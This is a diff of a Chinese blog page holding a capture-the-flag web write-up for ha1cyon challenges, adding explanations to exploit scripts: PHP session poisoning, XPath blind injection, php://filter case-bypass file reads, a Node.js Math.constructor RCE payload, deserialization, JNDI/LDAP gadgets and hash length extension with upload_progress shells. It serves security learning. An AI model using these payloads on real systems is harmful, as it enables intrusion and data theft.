@@ -379,14 +379,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.9k
+                    2.5k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    10 分
+                    13 分
                 </div>
                 
 
@@ -402,7 +402,43 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="超简单的PHP！！！超简单！！！"><a href="#超简单的PHP！！！超简单！！！" class="headerlink" title="超简单的PHP！！！超简单！！！"></a>超简单的PHP！！！超简单！！！</h2><pre><code>import requests
+                <h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><p>真签到题</p>
+<p>直接抓包看到</p>
+<p><img src="../../../../../../../images/ha1cyon/50.png" alt=""></p>
+<h2 id="超简单的PHP！！！超简单！！！"><a href="#超简单的PHP！！！超简单！！！" class="headerlink" title="超简单的PHP！！！超简单！！！"></a>超简单的PHP！！！超简单！！！</h2><p>主要代码：</p>
+<pre><code>header('content-type:application/json');
+session_start();
+function safe($msg){
+    if (strlen($msg)&gt;17){
+        return "msg is too loooong!";
+    } else {
+        return preg_replace("/php/","?",$msg);
+    }
+}
+
+if (!isset($_SESSION['msg'])&amp;empty($_SESSION['msg']))$_SESSION['msg'] = array();
+
+if (isset($_POST['msg']))
+{
+
+    array_push($_SESSION['msg'], ['msg'=&gt;safe($_POST['msg']),'time'=&gt;date('Y-m-d H:i:s',time())]);
+    echo json_encode(array(['msg'=&gt;safe($_POST['msg']),'time'=&gt;date('Y-m-d H:i:s',time())]));
+    exit();
+}
+if(!empty($_SESSION['msg'])){
+    echo json_encode($_SESSION['msg']);
+} else {echo "è¿ä¸å¿«å»çè¨ï¼";}</code></pre><p>可以看到可以修改session，然后有一个<code>phpinfo.php</code>文件</p>
+<p>看一下,看到<code>session.save_path</code>是空，也就是默认<code>/tmp</code></p>
+<p>有一个小限制</p>
+<pre><code>if (strlen($msg)&gt;17){
+        return "msg is too loooong!";
+    } else {
+        return preg_replace("/php/","?",$msg);
+    }</code></pre><p>不能用php，但是没有用<code>i</code>修饰符，就<code>PhP</code>绕过</p>
+<p>后面还有一个time的语句，</p>
+<p>就可以用换行<code>\n</code>和<code>#</code>注释来多次改session来写session文件</p>
+<p>脚本</p>
+<pre><code>import requests
 
 session = requests.session()
 
@@ -427,7 +463,13 @@ session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0
 burp0_url = "http://ha1cyon-ctf.fun:30135/index.bak.php?action=/tmp/sess_4feut4nk0o5o37jjsg8173opk3&amp;_=print_r(scandir('/'));print_r(file_get_contents('/FIag_!S_it'));"
 r=session.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
 print(r.text)
-</code></pre><h2 id="ezlogin"><a href="#ezlogin" class="headerlink" title="ezlogin"></a>ezlogin</h2><pre><code>import requests
+</code></pre><p><img src="../../../../../../../images/ha1cyon/chao-jiandan-php.png" alt=""></p>
+<h2 id="ezlogin"><a href="#ezlogin" class="headerlink" title="ezlogin"></a>ezlogin</h2><p>登录抓包看看，是xml请求，第一反应就是XXE，</p>
+<p>全部XXE打上去了并没有用，并不是XXE，</p>
+<p>而是XPATH盲注</p>
+<p><a href="https://www.cnblogs.com/backlion/p/8554749.html" target="_blank" rel="noopener">https://www.cnblogs.com/backlion/p/8554749.html</a></p>
+<p>脚本</p>
+<pre><code>import requests
 import re
 
 url='http://ha1cyon-ctf.fun:30163/'
@@ -484,7 +526,18 @@ for i in range(1,100):
             print(ro)
             break
 
-</code></pre><p><code>/admin.php?file=PhP://filter/Read=convert.basE64-encode/resource=/flag</code></p>
+</code></pre><p>注入得到：</p>
+<p><code>adm1n cf7414b5bdb2e65ee43083f4ddbc4d9f</code></p>
+<p>密码md5 解一下就是<code>gtfly123</code></p>
+<p>然后有一个文件包含，不能直接包含flag，显示有危险字符</p>
+<p>又是用php://了</p>
+<p>大概过滤了</p>
+<pre><code>php
+read
+base64</code></pre><p>简单大小写绕过</p>
+<p><code>/admin.php?file=PhP://filter/Read=convert.basE64-encode/resource=/flag</code></p>
+<p><img src="../../../../../../../images/ha1cyon/ezlogin.png" alt=""></p>
+<p>flag</p>
 <p>flag{95f4aaf6-ae61-47a6-affa-6d2811efbe0e}</p>
 <h2 id="验证🐎"><a href="#验证🐎" class="headerlink" title="验证🐎"></a>验证🐎</h2><p>代码</p>
 <pre><code>const express = require('express');
@@ -565,7 +618,22 @@ app.get('/', function (req, res) {
 
 app.listen(80, '0.0.0.0', () =&gt; {
   console.log('Start listening')
-});</code></pre><pre><code>import re
+});</code></pre><p>第一步是需要<code>if (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[0]) === md5(second+keys[0])) {</code></p>
+<p>可以看到用了<code>app.use(bodyParser.json());</code></p>
+<p>就是可以用json来绕过，</p>
+<p>弄一个这个</p>
+<pre><code>"first":{"length":"1"},"second":{"length":"1"}</code></pre><p>就可以绕过了，first和second现在都是object</p>
+<p>而first.length===second.length, 而且</p>
+<p>first!==second</p>
+<p>最关键是</p>
+<p><code>md5(first+keys[0]) === md5(second+keys[0])</code></p>
+<p>这个代码，<code>first</code>是一个对象，和<code>keys[0]</code>拼接的时候就转换成String</p>
+<p>而first的字符串和second的字符串相等，全部满足了</p>
+<p>然后就是用Math来RCE了，利用函数嵌套的样子来</p>
+<p>传入 Math+1 这个是字符形式</p>
+<p>这个就是一个题目改编的了</p>
+<p>脚本：</p>
+<pre><code>import re
 encode = lambda code: list(map(ord,code))
 decode = lambda code: "".join(map(chr,code))
 a=f"""
@@ -594,9 +662,11 @@ Connection: close
 Cookie: session=acc48197-782d-41d9-a631-2a3e81837e9a.s_KiQgbftrE7e0hu6hLPXKF0W3I; PHPSESSID=4feut4nk0o5o37jjsg8173opk3; PHPSESSION=eyJhZG1pbiI6MCwicmVzdWx0cyI6W119; PHPSESSION.sig=Af7dna727rpLpx--lZVqoWD5BKU
 Upgrade-Insecure-Requests: 1
 
-{"e":"(Math=&gt;(Math=Math.constructor,Math.x=Math.constructor(Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))()))(Math+1)","first":{"length":"1"},"second":{"length":"1"}}</code></pre><p>flag:</p>
+{"e":"(Math=&gt;(Math=Math.constructor,Math.x=Math.constructor(Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))()))(Math+1)","first":{"length":"1"},"second":{"length":"1"}}</code></pre><p><img src="../../../../../../../images/ha1cyon/yan-zheng-ma.png" alt=""></p>
+<p>flag:</p>
 <p>flag{8d82d5d6-741e-432a-be35-e43c23180b1a}</p>
-<h2 id="RealEzPHP"><a href="#RealEzPHP" class="headerlink" title="RealEzPHP"></a>RealEzPHP</h2><pre><code>&lt;?php
+<h2 id="RealEzPHP"><a href="#RealEzPHP" class="headerlink" title="RealEzPHP"></a>RealEzPHP</h2><p>就是一个简单反序列化，flag在phpinfo里面</p>
+<pre><code>&lt;?php
 class HelloPhp
 {
     public $a;
@@ -610,6 +680,7 @@ $a-&gt;a='phpinfo';
 echo urlencode(serialize($a));
 
 ?&gt;</code></pre><p><code>http://ha1cyon-ctf.fun:30089/time.php?data=O%3A8%3A%22HelloPhp%22%3A2%3A%7Bs%3A1%3A%22a%22%3Bs%3A7%3A%22phpinfo%22%3Bs%3A1%3A%22b%22%3Bs%3A14%3A%22call_user_func%22%3B%7D</code></p>
+<p><img src="../../../../../../../images/ha1cyon/real-ez.png" alt=""></p>
 <p>FLAG</p>
 <p>flag{7b0e7129-48fa-44b7-a8d8-8e1ed7d4a21e} </p>
 <h2 id="ezshiro"><a href="#ezshiro" class="headerlink" title="ezshiro"></a>ezshiro</h2><p>看到访问 <code>/json</code> 就跳到<code>/login</code>，</p>
@@ -693,7 +764,7 @@ echo urlencode(serialize($a));
 <p>结合<code>pom.xml</code>的<code>commons-collections</code>,</p>
 <p>就是利用LDAP返回序列化数据，触发本地Gadget，就是用Common Collections的了</p>
 <p>本来想用这个的文章的代码，<a href="https://github.com/kxcode/JNDI-Exploit-Bypass-Demo/blob/master/HackerServer/src/main/java/HackerLDAPRefServer.java" target="_blank" rel="noopener">https://github.com/kxcode/JNDI-Exploit-Bypass-Demo/blob/master/HackerServer/src/main/java/HackerLDAPRefServer.java</a></p>
-<p>没实践过高版本的，只试过低版本的,不过随便翻翻其他的看到了可以更简单的</p>
+<p>以前没实践过高版本的，只试过低版本的。然后随便翻翻其他的时候看到了可以更简单的</p>
 <p><code>ysomap</code>这个工具，在本地直接内网穿透</p>
 <pre><code>java -jar ysomap-cli-0.0.1-SNAPSHOT-all.jar
 use exploit LDAPLocalChainListener
@@ -713,13 +784,15 @@ file_put_contents('content',$a);
 <p>成功执行命令，RCE</p>
 <p>flag</p>
 <p>flag{ebcfc7fa-d9e7-4db1-9685-42684bc1aa76}</p>
-<h2 id="ezinclude"><a href="#ezinclude" class="headerlink" title="ezinclude"></a>ezinclude</h2><pre><code>import requests
+<h2 id="ezinclude"><a href="#ezinclude" class="headerlink" title="ezinclude"></a>ezinclude</h2><p>第一层又双叒叕是一个hash拓展攻击，没有长度就爆破一下 </p>
+<p>利用 <code>upload_progress</code></p>
+<pre><code>import requests
 import hashpumpy
 import urllib
 
 
 
-url='http://ha1cyon-ctf.fun:30004/flflflflag.php?file=/tmp/sess_hass13s37'
+url='http://ha1cyon-ctf.fun:30004/'
 
 for i in range(40):
     a,b=hashpumpy.hashpump('a3dabbc779f2fbf8b6f56113ca78a7f9','123444','1',i)
@@ -729,7 +802,13 @@ for i in range(40):
         print(req.text,url+"name={}&amp;pass={}".format(urllib.parse.quote(b),a))
 
 
-</code></pre><p>flag:</p>
+</code></pre><p>跳到</p>
+<p><code>flflflflag.php</code></p>
+<p>可以文件包含</p>
+<p>这里是用 <code>upload_progress</code>来写shell，然后包含</p>
+<p><img src="../../../../../../../images/ha1cyon/php-upload-progress.png" alt=""></p>
+<p>然后包含/tmp/m0on getshell，好像flag又是在phpinfo里面，根目录的是假的</p>
+<p>flag:</p>
 <p>flag{6b671cf1-9558-47f6-9cd2-46ff8e32a3e9}</p>
 <script>
         document.querySelectorAll('.github-emoji')
@@ -1104,7 +1183,7 @@ for i in range(40):
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">13.2k</span>&nbsp;字
+                class="white-color">13.8k</span>&nbsp;字
             
             
             
